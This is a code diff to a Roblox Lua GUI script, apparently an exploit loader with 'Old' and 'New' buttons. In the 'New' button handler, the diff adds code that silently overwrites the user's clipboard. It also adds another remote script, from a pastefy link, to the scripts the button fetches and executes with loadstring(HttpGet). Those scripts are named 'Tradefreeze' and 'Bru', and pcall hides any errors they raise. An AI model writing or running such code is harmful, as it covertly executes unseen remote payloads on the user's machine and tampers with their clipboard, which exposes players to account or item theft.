@@ -26,7 +26,6 @@ gradient.Color = ColorSequence.new{
 }
 gradient.Rotation = 90
 
--- Title
 local title = Instance.new("TextLabel")
 title.Size = UDim2.new(1, 0, 0, 50)
 title.BackgroundTransparency = 1
@@ -36,7 +35,6 @@ title.TextSize = 24
 title.TextColor3 = Color3.fromRGB(255,255,255)
 title.Parent = main
 
--- Close Button
 local close = Instance.new("TextButton")
 close.Size = UDim2.new(0, 35, 0, 35)
 close.Position = UDim2.new(1, -40, 0, 5)
@@ -62,7 +60,6 @@ close.MouseButton1Click:Connect(function()
     gui:Destroy()
 end)
 
--- Subtitle
 local sub = Instance.new("TextLabel")
 sub.Size = UDim2.new(1, 0, 0, 20)
 sub.Position = UDim2.new(0, 0, 0, 45)
@@ -117,11 +114,12 @@ end
 local oldBtn = createButton("(Unstable) Old", 0.07, true)
 local newBtn = createButton("New", 0.53, false)
 
+-- OLD
 oldBtn.MouseButton1Click:Connect(function()
     oldBtn.Text = "Loading..."
 
     pcall(function()
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/VoidScriptzz/Void_Hub2/refs/heads/main/MainLoader"))()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/VoidScriptzz/Void_Hub/refs/heads/main/MainLoaders", true))()
     end)
 
     oldBtn.Text = "Executed!"
@@ -129,9 +127,19 @@ oldBtn.MouseButton1Click:Connect(function()
     gui:Destroy()
 end)
 
+-- NEW
 newBtn.MouseButton1Click:Connect(function()
     newBtn.Text = "Loading..."
 
+    -- copy silently
+    local scriptText = 'loadstring(game:HttpGet("https://raw.githubusercontent.com/VoidScriptzz/Void_Hub/refs/heads/main/MainLoaders", true))()'
+    if setclipboard then
+        setclipboard(scriptText)
+    elseif toclipboard then
+        toclipboard(scriptText)
+    end
+
+    -- execute all
     task.spawn(function()
         pcall(function()
             loadstring(game:HttpGet("https://raw.githubusercontent.com/VoidScriptzz/Labullshittradefreeze/refs/heads/main/Tradefreeze"))()
@@ -141,6 +149,12 @@ newBtn.MouseButton1Click:Connect(function()
     task.spawn(function()
         pcall(function()
             loadstring(game:HttpGet("https://raw.githubusercontent.com/VoidScriptzz/Bringvacktge-loac/refs/heads/main/Bru"))()
+        end)
+    end)
+
+    task.spawn(function()
+        pcall(function()
+            loadstring(game:HttpGet("https://pastefy.app/UYi0eYo5/raw", true))()
         end)
     end)
 
